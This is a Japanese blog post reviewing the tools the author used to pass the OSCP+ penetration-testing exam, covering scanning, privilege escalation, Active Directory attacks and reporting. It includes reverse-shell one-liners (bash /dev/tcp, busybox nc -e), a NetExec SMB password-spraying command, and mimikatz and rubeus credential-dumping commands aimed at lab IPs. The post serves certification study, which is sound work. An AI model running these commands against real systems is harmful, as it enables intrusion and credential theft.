---
title: "OSCP+受験向け：使用したツール紹介"
date: 2025-11-29T10:53:56+09:00
description: OSCP+受験において実際に使用したツールや便利なリソースをまとめた紹介記事です。ポートスキャンから権限昇格、Active Directory列挙まで、OSCP+に役立つツールの使いどころや活用ポイントを解説しています。
draft: false
hideToc: false
enableToc: true
enableTocContent: true
tocPosition: inner
tocLevels: ["h2", "h3", "h4"]
tags:
- OSCP+
categories:
- Tools
series:
image: /posts/2025/11/img/2025-11-29_19-05.png
---

## はじめに

2024年11月から取り組んでいた OSCP+ に、無事合格することができました。

{{< img src="/posts/2025/11/img/2025-11-29_19-05.png" >}}

この記事では、受験期間を通して自分が実際に使い、特に役立ったツールを紹介していきます。それぞれのツールをどの場面で使っていたのか、どのようなメリットがあったのかをまとめています。

## Service Enumeration

### RustScan

最初に必ず走らせていたポートスキャナーです。

マシン攻略を始める際は、「RustScan」「nmap」「AutoRecon」とあわせて毎回セットで実行していました。

nmap よりも高速でスキャンしてくれるので、対象のマシンがどんなマシンなのかの概要を把握するのに重宝していました。

ただし、スキャン結果が常に正確とは限らず、開いているはずのポートを取りこぼすこともありました。

そのため、RustScan の結果だけに依存せず、nmap や AutoRecon の結果と突き合わせて整合性を確認するようにしていました。

{{< img src="/posts/2025/11/img/2025-11-29_17-39.png" >}}

### AutoRecon

RustScan や nmap で空いているポートが把握できた段階で実行していた自動列挙ツールです。

稼働しているサービスごとに複数のツールを呼び出して一括で列挙してくれるため、自分で個別のコマンドを入力する手間が大幅に減ります。

ただし、多数のツールを並行して動かす構造上、完了まである程度時間がかかります。 

そのため、AutoRecon を走らせている間は、Web サービスならサイトの巡回、怪しいポートがあれば手動での深掘りといった作業を同時に進めていました。

最初の頃は AutoRecon の出力からシェル奪取の糸口を探すことが多かったのですが、慣れてくるにつれて、AutoRecon の裏で進める手動列挙だけでシェルを奪取できるケースが増えていきました。  

{{< img src="/posts/2025/11/img/2025-11-29_17-41.png" >}}

### feroxbuster

Web コンテンツの列挙で頻繁に使っていたツールです。

gobuster も有名なツールですが、feroxbuster は発見したディレクトリに対して自動的に再帰スキャンを行ってくれる点が特に便利でした。

また、AutoRecon でも feroxbuster は実施してくれますが、 `-x` オプションで特定の拡張子を指定したい場面も多く、AutoRecon の情報は参考程度にすることが多かったです。

### Agartha (BurpSuite Extension)

LFI や SQLi 向けのペイロードを自動生成してくれる Burp Suite の Extension です。

機能自体はシンプルですが、ちょっと試したい文字列をすぐに作れるため、地味ながら便利でした。

{{< img src="/posts/2025/11/img/2025-11-29_18-15.png" >}}

### Example hashes

{{< blogcard url="https://hashcat.net/wiki/doku.php?id=example_hashes" >}}

hashcat の `-m` オプションで指定する ハッシュモード一覧 を確認するときに参照していたサイトです。

実際の例がずらっと掲載されているので、「このハッシュ形式って何番だっけ？」となった時にすぐに調べられるのが便利でした。

## Initial Access

### searchsploit

既知の脆弱性の PoC を検索できるツールです。

ソフトウェアのバージョンが判明したときや、普段触れないミドルウェア・CMS に遭遇した際にまず参照していました。

ただし、Google での検索も並行して行い、Exploit-DB に載っていない PoC や追加情報を拾いながら、情報の確度を高めるようにしていました。

### Reverse Shell Generator

リバースシェル用のペイロードを自動生成してくれるため、リバースシェル接続時のコマンド入力をコピペで終わらせられます。

{{< blogcard url="https://www.revshells.com/" >}}

特に以下の項目は頻繁に使用していました：

- Payloads
  - PowerShell #3（Base64）
  - Windows Staged Reverse TCP (x64)
- Listener
  - msfconsole

オプションが複雑だったりペイロードの生成にひと手間かかるものも多いため、正しいコマンドを楽に作れるツールとして重宝していました。

{{< img src="/posts/2025/11/img/2025-11-29_13-00.png" >}}

### NetExec

FTP / SMB / WinRM / MSSQL など、複数のサービスに対して認証試行やコマンド実行を行えるため、横展開のとっかかりとして非常に重宝していました。

他マシンから取得した認証情報を試す際に、対象ホストで該当サービスのポートが開いていればとりあえず実行してみるという運用が多かったです。

```bash
netexec smb 192.168.100.201 -u users.txt -p passwords.txt
```

上記のように SMB に対して辞書攻撃を行い、認証に成功しなければサービス名だけ変えて再実行できるのが楽で、コマンドも覚えやすい点がメリットでした。

また、認証に成功した場合は `-x` や `-X` などでコマンド実行もできるため、「 impacket-mssqlclient のオプションってどうだっけ？」のような、ツールの使用方法を確認するよりもまず NetExec で叩いて状況を確認するほうがスムーズでした。

### Remmina

リモートデスクトップ接続の際に最も多く使っていたクライアントです。

他のツール紹介でよく見かける xfreerdp ももちろん便利ですが、画面サイズが思うように調整できず、こちらのツールを使用するようになりました。

Remmina は GUI で IP・ユーザー名・パスワードを入力するだけで接続でき、ウィンドウを広げればそのまま画面も拡大できる点などがよかったです。

とはいえ、Remmina でエラーが発生した場合には xfreerdp を併用し、より詳細なログを確認して原因を切り分けることもありました。

普段は Remmina 、トラブルシュートは xfreerdp という使い分けをしていました。

{{< img src="/posts/2025/11/img/2025-11-29_17-49.png" >}}

## Privilege Escalation

### rlwrap

リバースシェル確立後の `^H` 問題（バックスペースが正常に動作しない現象） を解消するために使用していました。

特殊文字がそのまま入力されてしまう環境では、履歴も補完も効かず操作性が極端に落ちますが、rlwrap を挟むだけで一気に扱いやすくなります。

```bash
rlwrap nc -lvnp 4444
```

他にも、CTRL+Z を押した後に、 `stty raw...` のようなコマンドを打つ Full TTY の方法もありますが、tmux で画面サイズを頻繁に変更している場合は表示が崩れることが多くあったので、自分は rlwrap を使用していました。

また、補完・履歴管理・カラーハイライトなどの便利機能もオプションで付与できるため、普段は .zshrc に alias を設定していました。

```.zshrc
alias rlwrap="rlwrap -A -c -a -r -i -n"
```

### Sliver

C&C フレームワークとして Sliver を使用していました。

Reddit などでは「OSCP に C&C フレームワークは too match」という意見もありますが、個人的には、以下のような点から OSCP+ においても Sliver を使う意義は十分にあると考えています。

- 普段ペネトレーションテストを実施しない人でも、C2 がどのように動作するかを実際に体験できる
- 普段からペネトレーションテストを実施している人でも、商用 C2 との機能差や使い勝手を比較できる
- 実際に脅威アクターが Sliver を悪用している事例もあり、攻撃・防御の両面から理解が深まる

特に、使ってみて最も便利だと感じたのが、拡張パッケージマネージャである Armory の充実度です。

- 多数のツールを Sliver から直接実行可能
- 追加インストールが容易で、セッション中にそのまま利用可能
- 手動でダウンロード → 転送 → 実行といった手間が激減

後述するツールのいくつかは、実際に Sliver のセッション経由で利用していました。

{{< img src="/posts/2025/11/img/2025-11-29_17-57.png" >}}

### penelope

Linux 環境の nc などのリスナーの代替として使用していました。

シェルの自動アップグレードや、ファイルのアップロード・ダウンロードに利用しており、操作の手間を減らすことができます。

特に便利だったのが、以下のコマンドです。

```bash
run upload_privesc_scripts
```

このコマンドを使うと、「linpeas.sh」や「lse.sh」といった権限昇格列挙スクリプトを自動でアップロードしてくれるため、Linux 環境での権限昇格作業を効率的に進められました。

{{< img src="/posts/2025/11/img/2025-11-29_17-56.png" >}}

### PEASS-ng

権限昇格の列挙ツールといえば真っ先に名前が挙がる、有名どころのスクリプトです。

Windows・Linux のどちらでも、リバースシェルを確立したらまず最初に実行していました。

特に Linux 環境では、penelope のアップロード機能で自動配置できるため、セットアップの手間がほとんどありません。

また、パスワードが手に入っている場合には `-P` オプションを指定して追加情報を得ることもできます。

{{< img src="/posts/2025/11/img/2025-11-29_18-04.png" >}}

### Linux Smart Enumeration

こちらも Linux 環境向けの権限昇格列挙スクリプトです。

penelope のアップロード機能で自動配置できるため、セットアップに手間がかからず助かっていました。

Linux の権限昇格では、主に linpeas と lse.sh（Linux Smart Enumeration）の2つをメインに実行していました。

特に lse.sh はシンプルで結果が整理されて出てくるので、怪しい情報が見つからない場合は、そこから地道にディレクトリを探索して手掛かりを探す、という流れになることが多かったです。

{{< img src="/posts/2025/11/img/2025-11-29_18-03.png" >}}

### SharpUp

Windows 環境での権限昇格に利用していた列挙ツールです。

Linux と同様に、自動列挙のメインとして WinPEAS と SharpUp を実行していました。

特に SharpUp は、Windows 固有の設定ミスや権限の不備をすばやく拾ってくれるため、初動の列挙として重宝していました。

ただし、SharpUp で明確な脆弱性が見つからないケースも多いため、その場合は Linux と同様により丁寧に手動で列挙を進めていく流れになることが多かったです。

{{< img src="/posts/2025/11/img/2025-11-29_18-00.png" >}}

### busybox

リバースシェル用のペイロードとして busybox をよく使用していました。

一般的なリバースシェルでは、次のような Bash の TCP 接続を用いることが多い印象です。

```bash
bash -i >& /dev/tcp/192.168.100.122/6132 0>&1
```

ただ、この形式は > や / などの記号が含まれているため、Web アプリケーションの脆弱性を突く際に HTTP リクエストのパラメーターへ埋め込む場面ではエンコードが必要となることが多く、思わぬところで躓きがちでした。

その点、busybox を使ったペイロードは非常にシンプルで扱いやすいです。

```bash
busybox nc 192.168.100.201 4444 -e bash
```

- 記号がほとんど不要
- エンコードがほぼ不要
- 構文ミスが起きにくい

こうした利便性から、最終的には busybox のペイロードを使う場面が増えていきました。

### SweetPotato

Windows 環境での権限昇格では、Potato と呼ばれる攻撃手法があります。

その中でも有名なツールが GodPotato ですが、実際には環境によってうまく動作しないケースが意外と多いという印象でした。

代替手段を探していた際、以下のブログで SweetPotato が紹介されているのを見つけ、以降は Windows 権限昇格の最初の選択肢として使うようになりました。

{{< blogcard url="https://eins.li/posts/oscp-secret-sauce/" >}}

ひとつ不便なのが 公式でバイナリが公開されていない点です。

利用するには GitHub のソースコードから、自分でビルドする必要があります。

{{< blogcard url="https://github.com/CCob/SweetPotato" >}}

GitHub 上には他リポジトリにコンパイル済みの SweetPotato バイナリもありますが、「-e EfsRpc」オプションを使いたい場合は、上記リポジトリ版を自前でビルドする必要があります。

### GTFOBins

Unix 系アプリケーションの誤った権限設定や機能を悪用して、root 権限取得につながり得るコマンド例を体系的にまとめたサイトです。

SUID ビットが付与されたバイナリや、特定の権限で許可されたコマンドが存在する場合に、どのように権限昇格へ利用できるのかが、実例付きで分かりやすく整理されています。

{{< blogcard url="https://gtfobins.github.io/" >}}

## Post Exploitation

### BloodHound

Active Directory 環境における権限関係や攻撃経路を可視化するための分析ツールです。

{{< blogcard url="https://github.com/SpecterOps/BloodHound" >}}

最初は Legacy 版を使っていたのですが、検索処理が非常に重く、クエリを実行するたびに待たされていた印象です。

そのため、Community Edition に移行し、Kali Linux 上で `docker compose` によって起動して使用するようにしました。

{{< img src="/posts/2025/11/img/2025-11-29_15-32.png" >}}

### mimikatz

Windows 環境で認証情報を抽出する際の定番ツールです。

ただし、毎回バイナリをアップロードするのは手間がかかるため、Sliver セッション経由で mimikatz を実行する形に落ち着きました。

```bash
sliver (MS01) > mimikatz -t 300 -- "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

### rubeus

「AS-REP roasting」や「Kerberoast」を実行するために使用していました。

こちらも mimikatz と同様に、Sliver セッション上で実行していました。

```bash
sliver (MS01) > rubeus -- kerberoast

sliver (MS01) > rubeus -- asreproast
```

### ligolo-ng

内部ネットワークへ横展開していく際のトンネリングツールです

スタンドアロンマシンや、単純なポートフォワーディングだけで済む環境では chisel を使用していましたが、ADセットの場合は ligolo-ng を使用していました。

2025年4月にリリースされた v0.8 以降では Web UI が追加されたため、主にこの Web UI から設定していました。

{{< img src="/posts/2025/11/img/2025-11-29_15-36.png" >}}

## Report

### Sysreptor

レポート作成には Sysreptor を利用していました。

{{< blogcard url="https://github.com/Syslifters/sysreptor" >}}

このツールには OSCP 形式のテンプレートも用意されています。

公式のサンプルレポートを読んだあとに、Sysreptor でサンプルレポートを生成してみると、感動を覚えるはずです。

{{< blogcard url="https://help.offsec.com/hc/en-us/articles/360046787731-PEN-200-Reporting-Requirements#pwk-report-templates" >}}

ホストマシンの WSL 上で Sysreptor のローカルサーバーを立て、ブラウザから編集する形でレポートを作成していました。

{{< img src="/posts/2025/11/img/2025-11-29_18-08.png" >}}

### Flameshots

スクリーンショットの取得には Flameshots を使用していました。

矩形選択や、重要箇所を赤枠で強調できる機能が特に便利で、OSCPのレポート作成時に重宝していました。

{{< img src="/posts/2025/11/img/2025-11-29_17-21.png" >}}

## Misc

### tmux

端末を1画面で複数展開するために tmux を使用していました。

「1マシン＝1セッション」「フェーズごとにウィンドウ分割」といったように、自分なりのマシン攻略のルーティンを決めておくとよいと思います。

自分の場合は、以下のようにペインを4分割して使用するのがしっくりきていました。

{{< img src="/posts/2025/11/img/2025-11-29_16-28.png" >}}

- ペイン1: ペイン2やペイン3へのリバースシェル実行用
- ペイン2: メインの攻撃・調査作業用
- ペイン3: sliver / penelope などのセッション用
- ペイン4: ローカル作業用

なお、 tmux には、4分割を作る標準キーバインドがありません。

そのため、自分用にペインを一度に4分割するプラグインを作成しました。

{{< blogcard url="https://github.com/yuk1h1ra/tmux-split-window-cross-plugin" >}}

1回のキーバインドで4分割が完成するので、毎回ペインを分割する手間がなくなり快適になりました。

### Obsidian

Note Takingには Obsidian を使用しました。

ある OSCP 受験期の中で、「OSCP 受験直前に Notion に障害が発生し、閲覧等ができなくなった」という事例を見かけました。

私自身も普段から Notion に情報を集約させていたので当たり前のように Note Taking には Notion を用いる予定だったのですが、さすがに試験本番にメモが見れなくなるリスクがあることを考慮し、以下のような棲み分けを行いました。

- Notion：ツールの使い方、自分用チートシート、日々の勉強記録など
  → 試験当日に最悪見られなくても致命的にならない情報
- Obsidian：コースの内容、Challenge LabのWriteUPなど
  → 絶対に必要になるであろう情報をローカルで管理

特に Obsidian にまとめた過去コマンドや手順は、全文検索によってすぐに引き出せるため、試験当日の精神的な安心感にもつながりました。

{{< img src="/posts/2025/11/img/2025-11-29_16-41.png" >}}

※コース内容が含まれているため、一部マスキングしています。

### ANSI Color（VSCode Extension）

VSCode の Extension で、ターミナルやログのカラー表示を補助してくれます。

特に WinPEAS の結果を確認するときに色付きで表示されるのが便利でした。

{{< img src="/posts/2025/11/img/2025-11-29_16-59.png" >}}

### Cheatsheet

自分で一からチートシートを作成することはせず、既に先人がまとめてくれているものを活用していました。

#### Hacktricks

圧倒的な情報量で、OSCP+ でも実務でも活用している人が多いと思います。

{{< blogcard url="https://book.hacktricks.wiki/en/index.html" >}}

#### OSCP Notes

「Linux Post Exploitation」「Windows Post Exploitation」など、リバースシェル取得後の手動列挙フェーズを特に参照していました。

{{< blogcard url="https://gabb4r.gitbook.io/oscp-notes" >}}

#### Hacking Articles

マシン攻略中に Google で検索すると、だいたいこのサイトがヒットします。

特に権限昇格の記事でお世話になることが多かった印象です。

WinPEASで怪しい項目を見つけたら、「〈項目名〉 Hacking Articles」という感じで検索することも多々ありました。

{{< blogcard url="https://www.hackingarticles.in/" >}}

#### Active Directory Mindmap

Orange Cyber Defence の AD マインドマップです。

AD攻略の流れを全体的に理解するフェーズから、実際にコマンドを実行するフェーズまで、最初から最後までお世話になりました。

OCDの GitHub リポジトリにはダークテーマしかないのですが、lightテーマのほうが見やすかったので、こちらを参考にしていました。

{{< blogcard url="https://mayfly277.github.io/posts/AD-mindmap-2k25/" >}}

## おわりに

今回は、OSCP+ に役立つツールや、その活用ポイントを紹介しました。

この記事が、ツール選びの参考になり、学習や試験準備をスムーズに進める助けになれば幸いです。
